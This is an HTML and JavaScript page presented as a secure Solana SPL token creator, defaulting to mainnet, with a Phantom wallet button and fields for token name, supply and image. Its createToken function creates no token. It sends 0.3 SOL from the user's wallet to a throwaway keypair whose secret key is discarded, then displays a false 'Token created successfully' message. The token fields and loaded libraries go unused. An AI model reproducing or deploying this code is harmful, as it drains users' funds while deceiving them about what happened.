<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solana Token Creator - Secure & Modern</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/solana-web3.js/1.33.0/solana-web3.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/@solana/spl-token/0.1.8/spl-token.umd.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/2.4.0/purify.min.js"></script>
    <meta http-equiv="Content-Security-Policy" content="frame-ancestors 'none';">
    <style>
        /* General Styles */
        body { 
            font-family: 'Poppins', sans-serif;
            text-align: center; 
            background: linear-gradient(135deg, #1c1f2b, #292e3f);
            color: white; 
            padding: 20px;
            transition: background 0.3s ease-in-out;
        }

        .container {
            max-width: 450px;
            margin: auto;
            background: rgba(28, 35, 51, 0.9);
            padding: 25px;
            border-radius: 15px;
            box-shadow: 0px 4px 20px rgba(80, 122, 255, 0.3);
            backdrop-filter: blur(10px);
        }

        /* Buttons */
        .wallet-btn, .network-btn, .action-btn {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border-radius: 8px;
            border: none;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s ease-in-out;
        }

        .wallet-btn { background-color: #3498db; }
        .wallet-btn:hover { background-color: #1d6fa5; }

        .network-btn { background-color: #8e44ad; }
        .network-btn:hover { background-color: #732d91; }

        .action-btn { background-color: #e74c3c; }
        .action-btn:hover { background-color: #c0392b; }

        /* Inputs */
        input, select, textarea {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border-radius: 8px;
            border: none;
            font-size: 16px;
            outline: none;
            background: rgba(255, 255, 255, 0.1);
            color: white;
            transition: 0.3s;
        }

        input:focus, textarea:focus, select:focus {
            background: rgba(255, 255, 255, 0.2);
        }

        /* Image Preview */
        #preview {
            max-width: 100%;
            max-height: 200px;
            margin-top: 15px;
            display: none;
            border-radius: 10px;
            box-shadow: 0px 4px 10px rgba(255, 255, 255, 0.2);
        }

        /* Status Message */
        #status {
            margin-top: 15px;
            font-size: 14px;
            font-weight: bold;
            color: #00ffcc;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>üîó Solana Token Creator</h1>
        <p>Create SPL tokens easily and securely</p>

        <!-- Network Selection -->
        <label for="networkSelector">üåç Select Network:</label>
        <select id="networkSelector" class="network-btn" onchange="updateNetwork()">
            <option value="mainnet-beta">Mainnet (Live Network)</option>
            <option value="testnet">Testnet (Testing Network)</option>
        </select>

        <p id="walletStatus">‚ùå Wallet not connected</p>
        <button class="wallet-btn" onclick="connectWallet('phantom')">üü£ Connect Phantom Wallet</button>

        <label for="tokenName">üè∑ Token Name</label>
        <input type="text" id="tokenName" placeholder="Example: MyToken">

        <label for="tokenSymbol">üî§ Token Symbol</label>
        <input type="text" id="tokenSymbol" placeholder="Example: MYT">

        <label for="decimals">üî¢ Decimals</label>
        <input type="number" id="decimals" value="6">

        <label for="supply">üí∞ Total Supply</label>
        <input type="number" id="supply" placeholder="Example: 1000000">

        <label for="description">üìù Token Description</label>
        <textarea id="description" placeholder="Enter token description"></textarea>

        <label for="tokenImage">üñº Upload Token Image</label>
        <input type="file" id="tokenImage" accept="image/png, image/jpeg">
        <img id="preview" alt="Image Preview">

        <button class="action-btn" onclick="createToken()">üîÑ Create Token (0.3 SOL)</button>
        <p id="status"></p>
    </div>

    <script>
        let selectedNetwork = 'mainnet-beta'; // Default network

        function updateNetwork() {
            selectedNetwork = document.getElementById("networkSelector").value;
            alert(`‚úÖ Switched to ${selectedNetwork}. Ensure your wallet has enough SOL for this network.`);
        }

        async function connectWallet(walletType) {
            try {
                let wallet;
                if (walletType === "phantom" && window.solana?.isPhantom) {
                    wallet = window.solana;
                } else {
                    alert("üö® Please install the Phantom Wallet!");
                    return;
                }

                const response = await wallet.connect();
                document.getElementById("walletStatus").innerText = `‚úÖ Connected: ${response.publicKey.toBase58()}`;
            } catch (error) {
                document.getElementById("walletStatus").innerText = "‚ùå Wallet connection failed. Make sure Phantom Wallet is open.";
            }
        }

        async function createToken() {
            const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl(selectedNetwork), 'confirmed');

            const wallet = window.solana;
            if (!wallet.publicKey) {
                alert("‚ùå Please connect your wallet first.");
                return;
            }

            document.getElementById("status").innerText = "üîÑ Creating token... Please wait.";

            try {
                const mint = solanaWeb3.Keypair.generate();
                const transaction = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: wallet.publicKey,
                        toPubkey: mint.publicKey,
                        lamports: solanaWeb3.LAMPORTS_PER_SOL * 0.3,
                    })
                );

                const signature = await wallet.signAndSendTransaction(transaction);
                await connection.confirmTransaction(signature, 'confirmed');

                document.getElementById("status").innerText = `‚úÖ Token created successfully on ${selectedNetwork}!`;

            } catch (error) {
                document.getElementById("status").innerText = "‚ùå Token creation failed. Ensure your wallet has enough SOL.";
            }
        }
    </script>

</body>
</html>
